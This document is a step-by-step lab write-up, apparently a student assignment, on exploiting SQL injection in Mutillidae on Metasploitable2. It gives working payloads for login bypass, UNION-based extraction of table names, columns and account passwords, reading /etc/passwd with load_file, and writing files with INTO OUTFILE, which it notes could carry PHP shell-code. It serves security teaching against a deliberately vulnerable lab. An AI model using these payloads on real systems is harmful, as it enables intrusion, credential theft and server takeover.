# Sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

### Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/0dd63fc2-eb74-4f56-b274-41c9b46f3378)

### Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
**http://192.168.237.212/**

![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/c98bcdcf-c74b-4164-927c-4c44c2879a1f)

### Select Multidae from the menu listed as shown above. You will get the page as displayed below
![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/0c66a9d1-2d5b-4aa8-b9dc-09bd8178a5fa)

### Click on the menu Login/Register and register for an account
![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/129f9d52-83cc-492e-a828-6740734d83c7)

### Click on the link “Please register here”
![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/0f1b91f1-7fe5-4d24-9902-be0d2eaddaf3)

### Click on “Create Account” to display the following page
![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/e45b414d-d1ec-4359-bd05-74bdd00c1079)

### Click “Login”. The logged in page will show as below

![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/f6b1aa38-710b-42f0-9d2f-1891ae4c930f)

### Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/cffbf6b7-e45f-4c36-a061-2537f0085710)

### Click the login button and you will see it enter into the administrator page.
![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/7e4a39a1-f2af-49ee-934b-530eaf5a16e3)

## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below
![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/b7f036fc-f287-49da-83c9-a8760b0c943a)
![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/86e3de5a-c7c9-4ff6-9d0c-e6238d75944d)
![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/1c6ab57c-d71c-47f3-b975-3814bd084919)

### From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/fd2b544e-9b24-4130-9f93-cbc49bf5ddbd)

### Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.237.212/mutillidae/index.php?page=user-info.php&username=bharathi%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/610ef425-89e3-4d43-9e2c-692e74b54d79)

After adding the order by 6 into the existing url , the following error statement will be obtained

![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/69e2d9c4-8181-478a-8350-b8330cc127d5)

### When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/31564b7b-0d9d-4f4b-855c-2073a1a54e21)

### As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/de79f51b-a8c7-4bfe-a6e9-0d0abec9b16e)

### Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/1953cf32-0f1f-4530-ba7c-055044a76009)

### As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/1018dfb3-9aa6-466a-a012-9dda6dbb3553)

### Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.237.212/mutillidae/index.php?page=user-info.php&username=bharathi%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/38d76b5f-1caf-44db-9b34-f9483cf3e64d)

### The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=bharathi%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/8ea879d4-4c1b-4777-b98c-62ac25b53fc6)

### The url once executed will retrieve table names from the “owasp 10” database. ### Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/6a89e023-80a9-4e0e-bbb3-f0d45420e551)

### The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=bharathi%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/96e7a848-acd1-45ad-ba7d-6f4e17598f1c)


### Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=bharathi%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/f4427572-b45e-4f4d-945a-807613974fe6)


## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details 

![image](https://github.com/Jayabharathi3/sqlinjection/assets/120367796/ef20ed2e-14b7-483c-b28b-583cb3f98b9c)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
